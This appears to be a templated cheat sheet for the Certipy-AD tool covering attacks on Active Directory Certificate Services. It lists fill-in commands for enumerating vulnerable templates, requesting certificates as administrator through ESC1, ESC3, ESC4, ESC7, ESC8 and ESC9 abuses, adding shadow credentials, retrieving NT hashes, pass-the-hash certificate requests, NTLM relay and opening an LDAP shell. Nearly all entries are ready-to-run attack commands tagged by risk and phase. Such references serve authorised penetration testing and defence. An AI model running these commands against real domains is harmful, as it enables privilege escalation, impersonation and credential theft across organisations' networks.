# Certipy-AD

> Active Directory Certificate Services (AD CS) enumeration and ESC1-ESC10 abuse toolkit

<!-- tags: ad-cs, certipy, esc1, esc8, kerberos, certificates, ad -->

---

## find vulnerable cert templates
Enumerate AD CS templates and flag templates vulnerable to ESC1-ESC11.

```bash
certipy-ad find -u '{{USERNAME:str}}@{{DOMAIN:domain}}' -p '{{PASSWORD:str}}' -dc-ip {{DC_IP:ip}} -vulnerable -stdout
```

<!-- meta: risk=low | phase=enum | tags=enum,find,templates,vulnerable -->

---

## esc1 request cert SAN
Request a certificate as another user by specifying a UPN in the subject alternative name.

```bash
certipy-ad req -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSWORD:str}}' -target-ip {{CA_IP:ip}} -ca '{{CA_NAME:str:corp-CA}}' -template '{{TEMPLATE:str:ESC1}}' -upn 'administrator@{{DOMAIN:domain}}'
```

<!-- meta: risk=critical | phase=exploit | tags=esc1,san,impersonation -->

---

## auth pfx cert get nthash
Use a previously requested certificate to authenticate as the target user and retrieve their NT hash.

```bash
certipy-ad auth -pfx '{{PFX:file:administrator.pfx}}' -username '{{USERNAME:str:administrator}}' -domain '{{DOMAIN:domain}}' -dc-ip {{DC_IP:ip}}
```

<!-- meta: risk=critical | phase=exploit | tags=auth,pfx,nthash -->

---

## esc3 enrollment agent abuse
Request a cert on behalf of another user using an Enrollment Agent template.

```bash
certipy-ad req -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSWORD:str}}' -target-ip {{CA_IP:ip}} -ca '{{CA_NAME:str:corp-CA}}' -template '{{TEMPLATE:str:User}}' -on-behalf-of '{{DOMAIN:domain}}\administrator' -pfx '{{AGENT_PFX:file:agent.pfx}}'
```

<!-- meta: risk=critical | phase=exploit | tags=esc3,enrollment-agent,onbehalfof -->

---

## esc4 overwrite template
Overwrite a template configuration to make it vulnerable to ESC1, saving the original for restoration.

```bash
certipy-ad template -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSWORD:str}}' -template '{{TEMPLATE:str:ESC4-Test}}' -save-old
```

<!-- meta: risk=high | phase=exploit | tags=esc4,template,overwrite -->

---

## esc4 restore template config
Restore the saved configuration of a template after exploitation.

```bash
certipy-ad template -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSWORD:str}}' -template '{{TEMPLATE:str:ESC4-Test}}' -configuration '{{CONFIG:file:ESC4-Test.json}}'
```

<!-- meta: risk=low | phase=post | tags=esc4,template,restore -->

---

## add shadow credentials auto
Abuse `GenericWrite` over a target by adding a key credential link, then retrieve the NT hash.

```bash
certipy-ad shadow auto -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSWORD:str}}' -account '{{TARGET_USER:str}}'
```

<!-- meta: risk=high | phase=exploit | tags=shadow-credentials,kcd,nthash -->

---

## esc7 add officer rights
Grant yourself `ManageCertificates` rights on the CA to issue pending requests.

```bash
certipy-ad ca -ca '{{CA_NAME:str:corp-DC-CA}}' -add-officer '{{USERNAME:str}}' -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSWORD:str}}'
```

<!-- meta: risk=high | phase=exploit | tags=esc7,officer,manage-ca -->

---

## esc7 enable subca template
Enable the SubCA certificate template on the CA, required for the ESC7 attack chain.

```bash
certipy-ad ca -ca '{{CA_NAME:str:corp-DC-CA}}' -enable-template SubCA -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSWORD:str}}'
```

<!-- meta: risk=med | phase=exploit | tags=esc7,subca,template -->

---

## esc7 issue failed request
Force-issue a previously denied certificate request using ManageCertificates rights.

```bash
certipy-ad ca -ca '{{CA_NAME:str:corp-DC-CA}}' -issue-request {{REQUEST_ID:int}} -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSWORD:str}}'
```

<!-- meta: risk=high | phase=exploit | tags=esc7,issue,request -->

---

## esc7 retrieve issued cert
Download the certificate after the request has been approved.

```bash
certipy-ad req -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSWORD:str}}' -ca '{{CA_NAME:str:corp-DC-CA}}' -target {{CA_HOST:domain:ca.corp.local}} -retrieve {{REQUEST_ID:int}}
```

<!-- meta: risk=high | phase=exploit | tags=esc7,retrieve,download -->

---

## esc8 ntlm relay web enrollment
Run a relay listener that forwards inbound NTLM auth to the CA's web enrollment endpoint to obtain a cert.

```bash
certipy-ad relay -ca {{CA_HOST:domain:ca.corp.local}}
```

<!-- meta: risk=critical | phase=exploit | tags=esc8,ntlm-relay,web-enrollment -->

---

## esc9 modify UPN cert request
Update a target user's UPN to impersonate another principal in the certificate.

```bash
certipy-ad account update -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSWORD:str}}' -user '{{TARGET_USER:str}}' -upn '{{IMPERSONATE:str:Administrator}}'
```

<!-- meta: risk=high | phase=exploit | tags=esc9,upn,account-update -->

---

## request cert with NTLM hash
Request a certificate as a user using their NT hash (e.g., after Shadow Credentials).

```bash
certipy-ad req -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -hashes :{{NTHASH:str}} -ca '{{CA_NAME:str:corp-DC-CA}}' -template '{{TEMPLATE:str:User}}'
```

<!-- meta: risk=high | phase=exploit | tags=req,pth,hash,ntlm -->

---

## auth ldap shell schannel
Authenticate to LDAP using a certificate via Schannel for RBCD attacks.

```bash
certipy-ad auth -pfx '{{PFX:file:dc.pfx}}' -dc-ip {{DC_IP:ip}} -ldap-shell
```

<!-- meta: risk=critical | phase=exploit | tags=ldap-shell,schannel,rbcd -->

---

## list CA enrollment endpoints
Identify Certificate Enrollment Service URLs published by enterprise CAs.

```bash
certutil -enrollmentServerURL -config '{{CA_HOST:str:DC01.DOMAIN.LOCAL}}\{{CA_NAME:str:DOMAIN-CA}}'
```

<!-- meta: risk=safe | phase=enum | tags=certutil,enrollment,enumerate -->
